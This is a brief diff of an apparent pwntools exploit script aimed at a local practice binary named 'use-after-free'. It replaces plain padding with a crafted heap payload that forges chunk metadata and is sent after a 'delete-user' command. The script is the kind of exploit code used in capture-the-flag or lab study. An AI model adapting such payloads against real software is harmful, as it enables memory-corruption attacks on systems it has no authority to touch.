@@ -4,7 +4,7 @@ target = "use-after-free"
 
 p = process(target)
 
-payload = b"a"*48
+payload = b"a"*16 + b"user"+b"\x00"*12 +b'\x90'*16 + b"user"+b"\x00"*12 + b'\x01'*8 + b'\x21'+b'\x00'*7
 
 p.recvuntil(">>>")
 p.sendline("delete-user")
